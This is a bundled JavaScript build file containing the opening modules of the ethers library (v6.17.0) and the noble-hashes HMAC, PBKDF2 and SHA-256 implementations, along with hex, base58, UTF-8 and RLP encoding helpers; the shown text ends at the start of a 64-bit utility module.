(() => {
  var __defProp = Object.defineProperty;
  var __export = (target, all) => {
    for (var name in all)
      __defProp(target, name, { get: all[name], enumerable: true });
  };

  // node_modules/ethers/lib.esm/_version.js
  var version = "6.17.0";

  // node_modules/ethers/lib.esm/utils/properties.js
  function checkType(value, type, name) {
    const types = type.split("|").map((t) => t.trim());
    for (let i = 0; i < types.length; i++) {
      switch (type) {
        case "any":
          return;
        case "bigint":
        case "boolean":
        case "number":
        case "string":
          if (typeof value === type) {
            return;
          }
      }
    }
    const error = new Error(`invalid value for type ${type}`);
    error.code = "INVALID_ARGUMENT";
    error.argument = `value.${name}`;
    error.value = value;
    throw error;
  }
  async function resolveProperties(value) {
    const keys = Object.keys(value);
    const results = await Promise.all(keys.map((k) => Promise.resolve(value[k])));
    return results.reduce((accum, v, index) => {
      accum[keys[index]] = v;
      return accum;
    }, {});
  }
  function defineProperties(target, values, types) {
    for (let key in values) {
      let value = values[key];
      const type = types ? types[key] : null;
      if (type) {
        checkType(value, type, key);
      }
      Object.defineProperty(target, key, { enumerable: true, value, writable: false });
    }
  }

  // node_modules/ethers/lib.esm/utils/errors.js
  function stringify(value, seen) {
    if (value == null) {
      return "null";
    }
    if (seen == null) {
      seen = /* @__PURE__ */ new Set();
    }
    if (typeof value === "object") {
      if (seen.has(value)) {
        return "[Circular]";
      }
      seen.add(value);
    }
    if (Array.isArray(value)) {
      return "[ " + value.map((v) => stringify(v, seen)).join(", ") + " ]";
    }
    if (value instanceof Uint8Array) {
      const HEX = "0123456789abcdef";
      let result = "0x";
      for (let i = 0; i < value.length; i++) {
        result += HEX[value[i] >> 4];
        result += HEX[value[i] & 15];
      }
      return result;
    }
    if (typeof value === "object" && typeof value.toJSON === "function") {
      return stringify(value.toJSON(), seen);
    }
    switch (typeof value) {
      case "boolean":
      case "number":
      case "symbol":
        return value.toString();
      case "bigint":
        return BigInt(value).toString();
      case "string":
        return JSON.stringify(value);
      case "object": {
        const keys = Object.keys(value);
        keys.sort();
        return "{ " + keys.map((k) => `${stringify(k, seen)}: ${stringify(value[k], seen)}`).join(", ") + " }";
      }
    }
    return `[ COULD NOT SERIALIZE ]`;
  }
  function makeError(message, code, info) {
    let shortMessage = message;
    {
      const details = [];
      if (info) {
        if ("message" in info || "code" in info || "name" in info) {
          throw new Error(`value will overwrite populated values: ${stringify(info)}`);
        }
        for (const key in info) {
          if (key === "shortMessage") {
            continue;
          }
          const value = info[key];
          details.push(key + "=" + stringify(value));
        }
      }
      details.push(`code=${code}`);
      details.push(`version=${version}`);
      if (details.length) {
        message += " (" + details.join(", ") + ")";
      }
    }
    let error;
    switch (code) {
      case "INVALID_ARGUMENT":
        error = new TypeError(message);
        break;
      case "NUMERIC_FAULT":
      case "BUFFER_OVERRUN":
        error = new RangeError(message);
        break;
      default:
        error = new Error(message);
    }
    defineProperties(error, { code });
    if (info) {
      Object.assign(error, info);
    }
    if (error.shortMessage == null) {
      defineProperties(error, { shortMessage });
    }
    return error;
  }
  function assert(check, message, code, info) {
    if (!check) {
      throw makeError(message, code, info);
    }
  }
  function assertArgument(check, message, name, value) {
    assert(check, message, "INVALID_ARGUMENT", { argument: name, value });
  }
  var _normalizeForms = ["NFD", "NFC", "NFKD", "NFKC"].reduce((accum, form) => {
    try {
      if ("test".normalize(form) !== "test") {
        throw new Error("bad");
      }
      ;
      if (form === "NFD") {
        const check = String.fromCharCode(233).normalize("NFD");
        const expected = String.fromCharCode(101, 769);
        if (check !== expected) {
          throw new Error("broken");
        }
      }
      accum.push(form);
    } catch (error) {
    }
    return accum;
  }, []);
  function assertNormalize(form) {
    assert(_normalizeForms.indexOf(form) >= 0, "platform missing String.prototype.normalize", "UNSUPPORTED_OPERATION", {
      operation: "String.prototype.normalize",
      info: { form }
    });
  }
  function assertPrivate(givenGuard, guard, className) {
    if (className == null) {
      className = "";
    }
    if (givenGuard !== guard) {
      let method = className, operation = "new";
      if (className) {
        method += ".";
        operation += " " + className;
      }
      assert(false, `private constructor; use ${method}from* methods`, "UNSUPPORTED_OPERATION", {
        operation
      });
    }
  }

  // node_modules/ethers/lib.esm/utils/data.js
  function _getBytes(value, name, copy) {
    if (value instanceof Uint8Array) {
      if (copy) {
        return new Uint8Array(value);
      }
      return value;
    }
    if (typeof value === "string" && value.length % 2 === 0 && value.match(/^0x[0-9a-f]*$/i)) {
      const result = new Uint8Array((value.length - 2) / 2);
      let offset = 2;
      for (let i = 0; i < result.length; i++) {
        result[i] = parseInt(value.substring(offset, offset + 2), 16);
        offset += 2;
      }
      return result;
    }
    assertArgument(false, "invalid BytesLike value", name || "value", value);
  }
  function getBytes(value, name) {
    return _getBytes(value, name, false);
  }
  function getBytesCopy(value, name) {
    return _getBytes(value, name, true);
  }
  function isHexString(value, length) {
    if (typeof value !== "string" || !value.match(/^0x[0-9A-Fa-f]*$/)) {
      return false;
    }
    if (typeof length === "number" && value.length !== 2 + 2 * length) {
      return false;
    }
    if (length === true && value.length % 2 !== 0) {
      return false;
    }
    return true;
  }
  function isBytesLike(value) {
    return isHexString(value, true) || value instanceof Uint8Array;
  }
  var HexCharacters = "0123456789abcdef";
  function hexlify(data) {
    const bytes2 = getBytes(data);
    let result = "0x";
    for (let i = 0; i < bytes2.length; i++) {
      const v = bytes2[i];
      result += HexCharacters[(v & 240) >> 4] + HexCharacters[v & 15];
    }
    return result;
  }
  function concat(datas) {
    return "0x" + datas.map((d) => hexlify(d).substring(2)).join("");
  }
  function dataLength(data) {
    if (isHexString(data, true)) {
      return (data.length - 2) / 2;
    }
    return getBytes(data).length;
  }
  function dataSlice(data, start, end) {
    const bytes2 = getBytes(data);
    if (end != null && end > bytes2.length) {
      assert(false, "cannot slice beyond data bounds", "BUFFER_OVERRUN", {
        buffer: bytes2,
        length: bytes2.length,
        offset: end
      });
    }
    return hexlify(bytes2.slice(start == null ? 0 : start, end == null ? bytes2.length : end));
  }
  function zeroPad(data, length, left) {
    const bytes2 = getBytes(data);
    assert(length >= bytes2.length, "padding exceeds data length", "BUFFER_OVERRUN", {
      buffer: new Uint8Array(bytes2),
      length,
      offset: length + 1
    });
    const result = new Uint8Array(length);
    result.fill(0);
    if (left) {
      result.set(bytes2, length - bytes2.length);
    } else {
      result.set(bytes2, 0);
    }
    return hexlify(result);
  }
  function zeroPadValue(data, length) {
    return zeroPad(data, length, true);
  }

  // node_modules/ethers/lib.esm/utils/maths.js
  var BN_0 = BigInt(0);
  var BN_1 = BigInt(1);
  var maxValue = 9007199254740991;
  function toTwos(_value, _width) {
    let value = getBigInt(_value, "value");
    const width = BigInt(getNumber(_width, "width"));
    const limit = BN_1 << width - BN_1;
    if (value < BN_0) {
      value = -value;
      assert(value <= limit, "too low", "NUMERIC_FAULT", {
        operation: "toTwos",
        fault: "overflow",
        value: _value
      });
      const mask2 = (BN_1 << width) - BN_1;
      return (~value & mask2) + BN_1;
    } else {
      assert(value < limit, "too high", "NUMERIC_FAULT", {
        operation: "toTwos",
        fault: "overflow",
        value: _value
      });
    }
    return value;
  }
  function mask(_value, _bits) {
    const value = getUint(_value, "value");
    const bits = BigInt(getNumber(_bits, "bits"));
    return value & (BN_1 << bits) - BN_1;
  }
  function getBigInt(value, name) {
    switch (typeof value) {
      case "bigint":
        return value;
      case "number":
        assertArgument(Number.isInteger(value), "underflow", name || "value", value);
        assertArgument(value >= -maxValue && value <= maxValue, "overflow", name || "value", value);
        return BigInt(value);
      case "string":
        try {
          if (value === "") {
            throw new Error("empty string");
          }
          if (value[0] === "-" && value[1] !== "-") {
            return -BigInt(value.substring(1));
          }
          return BigInt(value);
        } catch (e) {
          assertArgument(false, `invalid BigNumberish string: ${e.message}`, name || "value", value);
        }
    }
    assertArgument(false, "invalid BigNumberish value", name || "value", value);
  }
  function getUint(value, name) {
    const result = getBigInt(value, name);
    assert(result >= BN_0, "unsigned value cannot be negative", "NUMERIC_FAULT", {
      fault: "overflow",
      operation: "getUint",
      value
    });
    return result;
  }
  var Nibbles = "0123456789abcdef";
  function toBigInt(value) {
    if (value instanceof Uint8Array) {
      let result = "0x0";
      for (const v of value) {
        result += Nibbles[v >> 4];
        result += Nibbles[v & 15];
      }
      return BigInt(result);
    }
    return getBigInt(value);
  }
  function getNumber(value, name) {
    switch (typeof value) {
      case "bigint":
        assertArgument(value >= -maxValue && value <= maxValue, "overflow", name || "value", value);
        return Number(value);
      case "number":
        assertArgument(Number.isInteger(value), "underflow", name || "value", value);
        assertArgument(value >= -maxValue && value <= maxValue, "overflow", name || "value", value);
        return value;
      case "string":
        try {
          if (value === "") {
            throw new Error("empty string");
          }
          return getNumber(BigInt(value), name);
        } catch (e) {
          assertArgument(false, `invalid numeric string: ${e.message}`, name || "value", value);
        }
    }
    assertArgument(false, "invalid numeric value", name || "value", value);
  }
  function toBeHex(_value, _width) {
    const value = getUint(_value, "value");
    let result = value.toString(16);
    if (_width == null) {
      if (result.length % 2) {
        result = "0" + result;
      }
    } else {
      const width = getNumber(_width, "width");
      if (width === 0 && value === BN_0) {
        return "0x";
      }
      assert(width * 2 >= result.length, `value exceeds width (${width} bytes)`, "NUMERIC_FAULT", {
        operation: "toBeHex",
        fault: "overflow",
        value: _value
      });
      while (result.length < width * 2) {
        result = "0" + result;
      }
    }
    return "0x" + result;
  }
  function toBeArray(_value, _width) {
    const value = getUint(_value, "value");
    if (value === BN_0) {
      const width = _width != null ? getNumber(_width, "width") : 0;
      return new Uint8Array(width);
    }
    let hex = value.toString(16);
    if (hex.length % 2) {
      hex = "0" + hex;
    }
    if (_width != null) {
      const width = getNumber(_width, "width");
      while (hex.length < width * 2) {
        hex = "00" + hex;
      }
      assert(width * 2 === hex.length, `value exceeds width (${width} bytes)`, "NUMERIC_FAULT", {
        operation: "toBeArray",
        fault: "overflow",
        value: _value
      });
    }
    const result = new Uint8Array(hex.length / 2);
    for (let i = 0; i < result.length; i++) {
      const offset = i * 2;
      result[i] = parseInt(hex.substring(offset, offset + 2), 16);
    }
    return result;
  }
  function toQuantity(value) {
    let result = hexlify(isBytesLike(value) ? value : toBeArray(value)).substring(2);
    while (result.startsWith("0")) {
      result = result.substring(1);
    }
    if (result === "") {
      result = "0";
    }
    return "0x" + result;
  }

  // node_modules/ethers/lib.esm/utils/base58.js
  var Alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
  var Lookup = null;
  function getAlpha(letter) {
    if (Lookup == null) {
      Lookup = {};
      for (let i = 0; i < Alphabet.length; i++) {
        Lookup[Alphabet[i]] = BigInt(i);
      }
    }
    const result = Lookup[letter];
    assertArgument(result != null, `invalid base58 value`, "letter", letter);
    return result;
  }
  var BN_02 = BigInt(0);
  var BN_58 = BigInt(58);
  function encodeBase58(_value) {
    const bytes2 = getBytes(_value);
    let value = toBigInt(bytes2);
    let result = "";
    while (value) {
      result = Alphabet[Number(value % BN_58)] + result;
      value /= BN_58;
    }
    for (let i = 0; i < bytes2.length; i++) {
      if (bytes2[i]) {
        break;
      }
      result = Alphabet[0] + result;
    }
    return result;
  }
  function decodeBase58(value) {
    let result = BN_02;
    for (let i = 0; i < value.length; i++) {
      result *= BN_58;
      result += getAlpha(value[i]);
    }
    return result;
  }

  // node_modules/ethers/lib.esm/utils/utf8.js
  function errorFunc(reason, offset, bytes2, output2, badCodepoint) {
    assertArgument(false, `invalid codepoint at offset ${offset}; ${reason}`, "bytes", bytes2);
  }
  function ignoreFunc(reason, offset, bytes2, output2, badCodepoint) {
    if (reason === "BAD_PREFIX" || reason === "UNEXPECTED_CONTINUE") {
      let i = 0;
      for (let o = offset + 1; o < bytes2.length; o++) {
        if (bytes2[o] >> 6 !== 2) {
          break;
        }
        i++;
      }
      return i;
    }
    if (reason === "OVERRUN") {
      return bytes2.length - offset - 1;
    }
    return 0;
  }
  function replaceFunc(reason, offset, bytes2, output2, badCodepoint) {
    if (reason === "OVERLONG") {
      assertArgument(typeof badCodepoint === "number", "invalid bad code point for replacement", "badCodepoint", badCodepoint);
      output2.push(badCodepoint);
      return 0;
    }
    output2.push(65533);
    return ignoreFunc(reason, offset, bytes2, output2, badCodepoint);
  }
  var Utf8ErrorFuncs = Object.freeze({
    error: errorFunc,
    ignore: ignoreFunc,
    replace: replaceFunc
  });
  function toUtf8Bytes(str, form) {
    assertArgument(typeof str === "string", "invalid string value", "str", str);
    if (form != null) {
      assertNormalize(form);
      str = str.normalize(form);
    }
    let result = [];
    for (let i = 0; i < str.length; i++) {
      const c = str.charCodeAt(i);
      if (c < 128) {
        result.push(c);
      } else if (c < 2048) {
        result.push(c >> 6 | 192);
        result.push(c & 63 | 128);
      } else if ((c & 64512) == 55296) {
        i++;
        const c2 = str.charCodeAt(i);
        assertArgument(i < str.length && (c2 & 64512) === 56320, "invalid surrogate pair", "str", str);
        const pair = 65536 + ((c & 1023) << 10) + (c2 & 1023);
        result.push(pair >> 18 | 240);
        result.push(pair >> 12 & 63 | 128);
        result.push(pair >> 6 & 63 | 128);
        result.push(pair & 63 | 128);
      } else {
        result.push(c >> 12 | 224);
        result.push(c >> 6 & 63 | 128);
        result.push(c & 63 | 128);
      }
    }
    return new Uint8Array(result);
  }

  // node_modules/ethers/lib.esm/utils/rlp-decode.js
  function hexlifyByte(value) {
    let result = value.toString(16);
    while (result.length < 2) {
      result = "0" + result;
    }
    return "0x" + result;
  }
  function unarrayifyInteger(data, offset, length) {
    let result = 0;
    for (let i = 0; i < length; i++) {
      result = result * 256 + data[offset + i];
    }
    return result;
  }
  function _decodeChildren(data, offset, childOffset, length) {
    const result = [];
    while (childOffset < offset + 1 + length) {
      const decoded = _decode(data, childOffset);
      result.push(decoded.result);
      childOffset += decoded.consumed;
      assert(childOffset <= offset + 1 + length, "child data too short", "BUFFER_OVERRUN", {
        buffer: data,
        length,
        offset
      });
    }
    return { consumed: 1 + length, result };
  }
  function _decode(data, offset) {
    assert(data.length !== 0, "data too short", "BUFFER_OVERRUN", {
      buffer: data,
      length: 0,
      offset: 1
    });
    const checkOffset = (offset2) => {
      assert(offset2 <= data.length, "data short segment too short", "BUFFER_OVERRUN", {
        buffer: data,
        length: data.length,
        offset: offset2
      });
    };
    if (data[offset] >= 248) {
      const lengthLength = data[offset] - 247;
      checkOffset(offset + 1 + lengthLength);
      const length = unarrayifyInteger(data, offset + 1, lengthLength);
      checkOffset(offset + 1 + lengthLength + length);
      return _decodeChildren(data, offset, offset + 1 + lengthLength, lengthLength + length);
    } else if (data[offset] >= 192) {
      const length = data[offset] - 192;
      checkOffset(offset + 1 + length);
      return _decodeChildren(data, offset, offset + 1, length);
    } else if (data[offset] >= 184) {
      const lengthLength = data[offset] - 183;
      checkOffset(offset + 1 + lengthLength);
      const length = unarrayifyInteger(data, offset + 1, lengthLength);
      checkOffset(offset + 1 + lengthLength + length);
      const result = hexlify(data.slice(offset + 1 + lengthLength, offset + 1 + lengthLength + length));
      return { consumed: 1 + lengthLength + length, result };
    } else if (data[offset] >= 128) {
      const length = data[offset] - 128;
      checkOffset(offset + 1 + length);
      const result = hexlify(data.slice(offset + 1, offset + 1 + length));
      return { consumed: 1 + length, result };
    }
    return { consumed: 1, result: hexlifyByte(data[offset]) };
  }
  function decodeRlp(_data) {
    const data = getBytes(_data, "data");
    const decoded = _decode(data, 0);
    assertArgument(decoded.consumed === data.length, "unexpected junk after rlp payload", "data", _data);
    return decoded.result;
  }

  // node_modules/ethers/lib.esm/utils/rlp-encode.js
  function arrayifyInteger(value) {
    const result = [];
    while (value) {
      result.unshift(value & 255);
      value >>= 8;
    }
    return result;
  }
  function _encode(object) {
    if (Array.isArray(object)) {
      let payload = [];
      object.forEach(function(child) {
        payload = payload.concat(_encode(child));
      });
      if (payload.length <= 55) {
        payload.unshift(192 + payload.length);
        return payload;
      }
      const length2 = arrayifyInteger(payload.length);
      length2.unshift(247 + length2.length);
      return length2.concat(payload);
    }
    const data = Array.prototype.slice.call(getBytes(object, "object"));
    if (data.length === 1 && data[0] <= 127) {
      return data;
    } else if (data.length <= 55) {
      data.unshift(128 + data.length);
      return data;
    }
    const length = arrayifyInteger(data.length);
    length.unshift(183 + length.length);
    return length.concat(data);
  }
  var nibbles = "0123456789abcdef";
  function encodeRlp(object) {
    let result = "0x";
    for (const v of _encode(object)) {
      result += nibbles[v >> 4];
      result += nibbles[v & 15];
    }
    return result;
  }

  // node_modules/ethers/lib.esm/utils/uuid.js
  function uuidV4(randomBytes4) {
    const bytes2 = getBytes(randomBytes4, "randomBytes");
    bytes2[6] = bytes2[6] & 15 | 64;
    bytes2[8] = bytes2[8] & 63 | 128;
    const value = hexlify(bytes2);
    return [
      value.substring(2, 10),
      value.substring(10, 14),
      value.substring(14, 18),
      value.substring(18, 22),
      value.substring(22, 34)
    ].join("-");
  }

  // node_modules/@noble/hashes/esm/_assert.js
  function number(n) {
    if (!Number.isSafeInteger(n) || n < 0)
      throw new Error(`Wrong positive integer: ${n}`);
  }
  function bytes(b, ...lengths) {
    if (!(b instanceof Uint8Array))
      throw new Error("Expected Uint8Array");
    if (lengths.length > 0 && !lengths.includes(b.length))
      throw new Error(`Expected Uint8Array of length ${lengths}, not of length=${b.length}`);
  }
  function hash(hash2) {
    if (typeof hash2 !== "function" || typeof hash2.create !== "function")
      throw new Error("Hash should be wrapped by utils.wrapConstructor");
    number(hash2.outputLen);
    number(hash2.blockLen);
  }
  function exists(instance, checkFinished = true) {
    if (instance.destroyed)
      throw new Error("Hash instance has been destroyed");
    if (checkFinished && instance.finished)
      throw new Error("Hash#digest() has already been called");
  }
  function output(out, instance) {
    bytes(out);
    const min = instance.outputLen;
    if (out.length < min) {
      throw new Error(`digestInto() expects output buffer of length at least ${min}`);
    }
  }

  // node_modules/@noble/hashes/esm/crypto.js
  var crypto = typeof globalThis === "object" && "crypto" in globalThis ? globalThis.crypto : void 0;

  // node_modules/@noble/hashes/esm/utils.js
  var u8a = (a) => a instanceof Uint8Array;
  var u32 = (arr) => new Uint32Array(arr.buffer, arr.byteOffset, Math.floor(arr.byteLength / 4));
  var createView = (arr) => new DataView(arr.buffer, arr.byteOffset, arr.byteLength);
  var rotr = (word, shift) => word << 32 - shift | word >>> shift;
  var isLE = new Uint8Array(new Uint32Array([287454020]).buffer)[0] === 68;
  if (!isLE)
    throw new Error("Non little-endian hardware is not supported");
  var nextTick = async () => {
  };
  async function asyncLoop(iters, tick, cb) {
    let ts = Date.now();
    for (let i = 0; i < iters; i++) {
      cb(i);
      const diff = Date.now() - ts;
      if (diff >= 0 && diff < tick)
        continue;
      await nextTick();
      ts += diff;
    }
  }
  function utf8ToBytes(str) {
    if (typeof str !== "string")
      throw new Error(`utf8ToBytes expected string, got ${typeof str}`);
    return new Uint8Array(new TextEncoder().encode(str));
  }
  function toBytes(data) {
    if (typeof data === "string")
      data = utf8ToBytes(data);
    if (!u8a(data))
      throw new Error(`expected Uint8Array, got ${typeof data}`);
    return data;
  }
  function concatBytes(...arrays) {
    const r = new Uint8Array(arrays.reduce((sum, a) => sum + a.length, 0));
    let pad = 0;
    arrays.forEach((a) => {
      if (!u8a(a))
        throw new Error("Uint8Array expected");
      r.set(a, pad);
      pad += a.length;
    });
    return r;
  }
  var Hash = class {
    // Safe version that clones internal state
    clone() {
      return this._cloneInto();
    }
  };
  var toStr = {}.toString;
  function checkOpts(defaults, opts) {
    if (opts !== void 0 && toStr.call(opts) !== "[object Object]")
      throw new Error("Options should be object or undefined");
    const merged = Object.assign(defaults, opts);
    return merged;
  }
  function wrapConstructor(hashCons) {
    const hashC = (msg) => hashCons().update(toBytes(msg)).digest();
    const tmp = hashCons();
    hashC.outputLen = tmp.outputLen;
    hashC.blockLen = tmp.blockLen;
    hashC.create = () => hashCons();
    return hashC;
  }
  function wrapXOFConstructorWithOpts(hashCons) {
    const hashC = (msg, opts) => hashCons(opts).update(toBytes(msg)).digest();
    const tmp = hashCons({});
    hashC.outputLen = tmp.outputLen;
    hashC.blockLen = tmp.blockLen;
    hashC.create = (opts) => hashCons(opts);
    return hashC;
  }
  function randomBytes(bytesLength = 32) {
    if (crypto && typeof crypto.getRandomValues === "function") {
      return crypto.getRandomValues(new Uint8Array(bytesLength));
    }
    throw new Error("crypto.getRandomValues must be defined");
  }

  // node_modules/@noble/hashes/esm/hmac.js
  var HMAC = class extends Hash {
    constructor(hash2, _key) {
      super();
      this.finished = false;
      this.destroyed = false;
      hash(hash2);
      const key = toBytes(_key);
      this.iHash = hash2.create();
      if (typeof this.iHash.update !== "function")
        throw new Error("Expected instance of class which extends utils.Hash");
      this.blockLen = this.iHash.blockLen;
      this.outputLen = this.iHash.outputLen;
      const blockLen = this.blockLen;
      const pad = new Uint8Array(blockLen);
      pad.set(key.length > blockLen ? hash2.create().update(key).digest() : key);
      for (let i = 0; i < pad.length; i++)
        pad[i] ^= 54;
      this.iHash.update(pad);
      this.oHash = hash2.create();
      for (let i = 0; i < pad.length; i++)
        pad[i] ^= 54 ^ 92;
      this.oHash.update(pad);
      pad.fill(0);
    }
    update(buf) {
      exists(this);
      this.iHash.update(buf);
      return this;
    }
    digestInto(out) {
      exists(this);
      bytes(out, this.outputLen);
      this.finished = true;
      this.iHash.digestInto(out);
      this.oHash.update(out);
      this.oHash.digestInto(out);
      this.destroy();
    }
    digest() {
      const out = new Uint8Array(this.oHash.outputLen);
      this.digestInto(out);
      return out;
    }
    _cloneInto(to) {
      to || (to = Object.create(Object.getPrototypeOf(this), {}));
      const { oHash, iHash, finished, destroyed, blockLen, outputLen } = this;
      to = to;
      to.finished = finished;
      to.destroyed = destroyed;
      to.blockLen = blockLen;
      to.outputLen = outputLen;
      to.oHash = oHash._cloneInto(to.oHash);
      to.iHash = iHash._cloneInto(to.iHash);
      return to;
    }
    destroy() {
      this.destroyed = true;
      this.oHash.destroy();
      this.iHash.destroy();
    }
  };
  var hmac = (hash2, key, message) => new HMAC(hash2, key).update(message).digest();
  hmac.create = (hash2, key) => new HMAC(hash2, key);

  // node_modules/@noble/hashes/esm/pbkdf2.js
  function pbkdf2Init(hash2, _password, _salt, _opts) {
    hash(hash2);
    const opts = checkOpts({ dkLen: 32, asyncTick: 10 }, _opts);
    const { c, dkLen, asyncTick } = opts;
    number(c);
    number(dkLen);
    number(asyncTick);
    if (c < 1)
      throw new Error("PBKDF2: iterations (c) should be >= 1");
    const password = toBytes(_password);
    const salt = toBytes(_salt);
    const DK = new Uint8Array(dkLen);
    const PRF = hmac.create(hash2, password);
    const PRFSalt = PRF._cloneInto().update(salt);
    return { c, dkLen, asyncTick, DK, PRF, PRFSalt };
  }
  function pbkdf2Output(PRF, PRFSalt, DK, prfW, u) {
    PRF.destroy();
    PRFSalt.destroy();
    if (prfW)
      prfW.destroy();
    u.fill(0);
    return DK;
  }
  function pbkdf2(hash2, password, salt, opts) {
    const { c, dkLen, DK, PRF, PRFSalt } = pbkdf2Init(hash2, password, salt, opts);
    let prfW;
    const arr = new Uint8Array(4);
    const view = createView(arr);
    const u = new Uint8Array(PRF.outputLen);
    for (let ti = 1, pos = 0; pos < dkLen; ti++, pos += PRF.outputLen) {
      const Ti = DK.subarray(pos, pos + PRF.outputLen);
      view.setInt32(0, ti, false);
      (prfW = PRFSalt._cloneInto(prfW)).update(arr).digestInto(u);
      Ti.set(u.subarray(0, Ti.length));
      for (let ui = 1; ui < c; ui++) {
        PRF._cloneInto(prfW).update(u).digestInto(u);
        for (let i = 0; i < Ti.length; i++)
          Ti[i] ^= u[i];
      }
    }
    return pbkdf2Output(PRF, PRFSalt, DK, prfW, u);
  }

  // node_modules/@noble/hashes/esm/_sha2.js
  function setBigUint64(view, byteOffset, value, isLE2) {
    if (typeof view.setBigUint64 === "function")
      return view.setBigUint64(byteOffset, value, isLE2);
    const _32n2 = BigInt(32);
    const _u32_max = BigInt(4294967295);
    const wh = Number(value >> _32n2 & _u32_max);
    const wl = Number(value & _u32_max);
    const h = isLE2 ? 4 : 0;
    const l = isLE2 ? 0 : 4;
    view.setUint32(byteOffset + h, wh, isLE2);
    view.setUint32(byteOffset + l, wl, isLE2);
  }
  var SHA2 = class extends Hash {
    constructor(blockLen, outputLen, padOffset, isLE2) {
      super();
      this.blockLen = blockLen;
      this.outputLen = outputLen;
      this.padOffset = padOffset;
      this.isLE = isLE2;
      this.finished = false;
      this.length = 0;
      this.pos = 0;
      this.destroyed = false;
      this.buffer = new Uint8Array(blockLen);
      this.view = createView(this.buffer);
    }
    update(data) {
      exists(this);
      const { view, buffer, blockLen } = this;
      data = toBytes(data);
      const len = data.length;
      for (let pos = 0; pos < len; ) {
        const take = Math.min(blockLen - this.pos, len - pos);
        if (take === blockLen) {
          const dataView = createView(data);
          for (; blockLen <= len - pos; pos += blockLen)
            this.process(dataView, pos);
          continue;
        }
        buffer.set(data.subarray(pos, pos + take), this.pos);
        this.pos += take;
        pos += take;
        if (this.pos === blockLen) {
          this.process(view, 0);
          this.pos = 0;
        }
      }
      this.length += data.length;
      this.roundClean();
      return this;
    }
    digestInto(out) {
      exists(this);
      output(out, this);
      this.finished = true;
      const { buffer, view, blockLen, isLE: isLE2 } = this;
      let { pos } = this;
      buffer[pos++] = 128;
      this.buffer.subarray(pos).fill(0);
      if (this.padOffset > blockLen - pos) {
        this.process(view, 0);
        pos = 0;
      }
      for (let i = pos; i < blockLen; i++)
        buffer[i] = 0;
      setBigUint64(view, blockLen - 8, BigInt(this.length * 8), isLE2);
      this.process(view, 0);
      const oview = createView(out);
      const len = this.outputLen;
      if (len % 4)
        throw new Error("_sha2: outputLen should be aligned to 32bit");
      const outLen = len / 4;
      const state = this.get();
      if (outLen > state.length)
        throw new Error("_sha2: outputLen bigger than state");
      for (let i = 0; i < outLen; i++)
        oview.setUint32(4 * i, state[i], isLE2);
    }
    digest() {
      const { buffer, outputLen } = this;
      this.digestInto(buffer);
      const res = buffer.slice(0, outputLen);
      this.destroy();
      return res;
    }
    _cloneInto(to) {
      to || (to = new this.constructor());
      to.set(...this.get());
      const { blockLen, buffer, length, finished, destroyed, pos } = this;
      to.length = length;
      to.pos = pos;
      to.finished = finished;
      to.destroyed = destroyed;
      if (length % blockLen)
        to.buffer.set(buffer);
      return to;
    }
  };

  // node_modules/@noble/hashes/esm/sha256.js
  var Chi = (a, b, c) => a & b ^ ~a & c;
  var Maj = (a, b, c) => a & b ^ a & c ^ b & c;
  var SHA256_K = /* @__PURE__ */ new Uint32Array([
    1116352408,
    1899447441,
    3049323471,
    3921009573,
    961987163,
    1508970993,
    2453635748,
    2870763221,
    3624381080,
    310598401,
    607225278,
    1426881987,
    1925078388,
    2162078206,
    2614888103,
    3248222580,
    3835390401,
    4022224774,
    264347078,
    604807628,
    770255983,
    1249150122,
    1555081692,
    1996064986,
    2554220882,
    2821834349,
    2952996808,
    3210313671,
    3336571891,
    3584528711,
    113926993,
    338241895,
    666307205,
    773529912,
    1294757372,
    1396182291,
    1695183700,
    1986661051,
    2177026350,
    2456956037,
    2730485921,
    2820302411,
    3259730800,
    3345764771,
    3516065817,
    3600352804,
    4094571909,
    275423344,
    430227734,
    506948616,
    659060556,
    883997877,
    958139571,
    1322822218,
    1537002063,
    1747873779,
    1955562222,
    2024104815,
    2227730452,
    2361852424,
    2428436474,
    2756734187,
    3204031479,
    3329325298
  ]);
  var IV = /* @__PURE__ */ new Uint32Array([
    1779033703,
    3144134277,
    1013904242,
    2773480762,
    1359893119,
    2600822924,
    528734635,
    1541459225
  ]);
  var SHA256_W = /* @__PURE__ */ new Uint32Array(64);
  var SHA256 = class extends SHA2 {
    constructor() {
      super(64, 32, 8, false);
      this.A = IV[0] | 0;
      this.B = IV[1] | 0;
      this.C = IV[2] | 0;
      this.D = IV[3] | 0;
      this.E = IV[4] | 0;
      this.F = IV[5] | 0;
      this.G = IV[6] | 0;
      this.H = IV[7] | 0;
    }
    get() {
      const { A, B, C, D, E, F, G, H } = this;
      return [A, B, C, D, E, F, G, H];
    }
    // prettier-ignore
    set(A, B, C, D, E, F, G, H) {
      this.A = A | 0;
      this.B = B | 0;
      this.C = C | 0;
      this.D = D | 0;
      this.E = E | 0;
      this.F = F | 0;
      this.G = G | 0;
      this.H = H | 0;
    }
    process(view, offset) {
      for (let i = 0; i < 16; i++, offset += 4)
        SHA256_W[i] = view.getUint32(offset, false);
      for (let i = 16; i < 64; i++) {
        const W15 = SHA256_W[i - 15];
        const W2 = SHA256_W[i - 2];
        const s0 = rotr(W15, 7) ^ rotr(W15, 18) ^ W15 >>> 3;
        const s1 = rotr(W2, 17) ^ rotr(W2, 19) ^ W2 >>> 10;
        SHA256_W[i] = s1 + SHA256_W[i - 7] + s0 + SHA256_W[i - 16] | 0;
      }
      let { A, B, C, D, E, F, G, H } = this;
      for (let i = 0; i < 64; i++) {
        const sigma1 = rotr(E, 6) ^ rotr(E, 11) ^ rotr(E, 25);
        const T12 = H + sigma1 + Chi(E, F, G) + SHA256_K[i] + SHA256_W[i] | 0;
        const sigma0 = rotr(A, 2) ^ rotr(A, 13) ^ rotr(A, 22);
        const T22 = sigma0 + Maj(A, B, C) | 0;
        H = G;
        G = F;
        F = E;
        E = D + T12 | 0;
        D = C;
        C = B;
        B = A;
        A = T12 + T22 | 0;
      }
      A = A + this.A | 0;
      B = B + this.B | 0;
      C = C + this.C | 0;
      D = D + this.D | 0;
      E = E + this.E | 0;
      F = F + this.F | 0;
      G = G + this.G | 0;
      H = H + this.H | 0;
      this.set(A, B, C, D, E, F, G, H);
    }
    roundClean() {
      SHA256_W.fill(0);
    }
    destroy() {
      this.set(0, 0, 0, 0, 0, 0, 0, 0);
      this.buffer.fill(0);
    }
  };
  var sha256 = /* @__PURE__ */ wrapConstructor(() => new SHA256());

  // node_modules/@noble/hashes/esm/_u64.js
  var U32_MASK64 = /* @__PURE__ */ BigInt(2 ** 32 - 1);
